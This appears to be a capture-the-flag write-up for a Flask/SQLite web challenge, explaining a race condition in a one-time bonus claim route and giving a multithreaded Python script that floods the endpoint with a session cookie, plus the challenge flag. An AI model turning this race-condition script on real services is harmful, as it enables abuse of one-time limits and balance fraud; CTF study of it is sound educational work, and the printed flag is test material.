![image](https://github.com/user-attachments/assets/aed90ea8-d1de-4a71-a972-cdef13c48e7c)

## How the app works:
![image](https://github.com/user-attachments/assets/208f501c-21f0-45d4-ac6f-cd03939f0cf3) ![image](https://github.com/user-attachments/assets/b00a16b4-bfd9-4f8e-9f33-a536c6309b4e)

**/register** - New user with 1000 balance. 
**/claim **- +1000 bonus (1 per user). 
**/buy_flag** - Need 3000 balance for flag

## What Actually Happened (My Mistake Story):
Okay so at first  I thought this challenge was something about token or session attack. 
I spent like 5-10 minutes trying to look at the session cookie  maybe it’s something like JWT, or weak secret key, or something I could decode. 
But turns out... 
```
Flask uses os.urandom(16) for app.secret_key
```
which is random and basically impossible to guess unless you control the server. 
My mistake la G I should’ve just read the backend code properly from the start.

## What I Found After Reading the Backend
After checking the source code  I saw something interesting in the /claim route.
```js
cur = db.execute('SELECT claimed FROM redemptions WHERE username=?', (username,))
row = cur.fetchone()
if row and row['claimed']:
    flash("You have already claimed your daily bonus!", "danger")
    return redirect(url_for('dashboard'))

db.execute('INSERT OR REPLACE INTO redemptions (username, claimed) VALUES (?, 1)', (username,))
db.execute('UPDATE users SET balance = balance + 1000 WHERE username=?', (username,))
db.commit()
```
At first glance, I was like looks okay…
But if you search online or check basic references about Race Condition on database 
especially for Flask + SQLite  you’ll find that this pattern can be risky if the database doesn’t have locking mechanism or transaction isolation.
Reference example: https://portswigger.net/web-security/race-conditions
Here’s another way to do this via burp: https://medium.com/@mahakjaiswani888/race-condition-vulnerability-f92de47aa55c

## Why This Can Be Exploited?
Since the code checks if claimed=1 first  then only after that it updates the balance and sets claimed=1
there is a small window where I can spam multiple requests fast enough before the server saves claimed=1 to the database.
SQLite doesn’t handle this by default unless you use special locking or transaction isolation which this code doesn’t have.

## Exploit Steps
![image](https://github.com/user-attachments/assets/9a8a59c0-af40-4ced-ae57-3609dd62ba26)

•	Register new account - get 1000 balance.

•	Don’t claim the daily bonus 

•	Spam **/claim** fast using Python multithreading. (Again, we need UNCOLLECTED DAILY BONUS jwt-token for this!)

![image](https://github.com/user-attachments/assets/548cf9f5-cbdf-4f72-83bd-3e253a1fb87e)
Here’s the cracker.py :
```python
import threading
import requests

# Replace these with your target URL and session cookie
BASE_URL = "http://159.69.219.192:7859"
SESSION_COOKIE = "UNCLAIMED DAILY USER TOKEN"

def claim_bonus():
    headers = {"Cookie": f"session={SESSION_COOKIE}"}
    response = requests.post(f"{BASE_URL}/claim", headers=headers)
    print(response.text)

# Create multiple threads to exploit the race condition
threads = []
for _ in range(10):  # Adjust the number of threads as needed
    thread = threading.Thread(target=claim_bonus)
    threads.append(thread)
    thread.start()

# Wait for all threads to complete
for thread in threads:
    thread.join()

print("Exploit completed. Check your balance on /dashboard.")
```
![image](https://github.com/user-attachments/assets/c81b0931-82d7-4a63-8d45-f8c946108e78)

•	Simply refresh our web and finally, redeem flag at **/buy_flag.**

![image](https://github.com/user-attachments/assets/e8a40c47-8adc-4b48-b733-e158c6f8de4c) ![image](https://github.com/user-attachments/assets/bf280620-443a-4ca8-b9aa-e4cb008bedd7)

•	And here’s the flag!! 
UMCS{th3_s0lut10n_1s_pr3tty_str41ghtf0rw4rd_too!}

